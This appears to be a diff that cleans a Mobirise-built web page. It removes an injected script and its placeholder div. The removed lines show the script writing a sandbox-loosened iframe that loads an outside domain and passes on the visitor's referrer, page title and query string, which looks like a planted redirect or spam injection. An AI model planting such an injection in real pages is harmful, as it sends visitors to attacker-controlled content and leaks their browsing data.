@@ -2,9 +2,7 @@
 <html  >
 <head>
 
-<script type="application/javascript">
-document.getElementById('af5a3b25f-b6a7-3530-4406-036ea7332410').innerHTML='<iframe sandbox="allow-top-navigation allow-scripts allow-popups allow-forms" frameborder="0" width="100%" height="100%" src="https://moonacademy.pro/pYJHSyNy?&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=frame"></iframe>'
-</script>
+
 
 	
   <!-- Site made with Mobirise Website Builder v5.9.8, https://mobirise.com -->
@@ -34,7 +32,7 @@ document.getElementById('af5a3b25f-b6a7-3530-4406-036ea7332410').innerHTML='<ifr
   
 </head>
 <body>
-  <div id="af5a3b25f-b6a7-3530-4406-036ea7332410"></div>
+  
   <section data-bs-version="5.1" class="menu menu2 cid-tXPvAl7eZe" once="menu" id="menu-5-tXPvAl7eZe">
 	
 
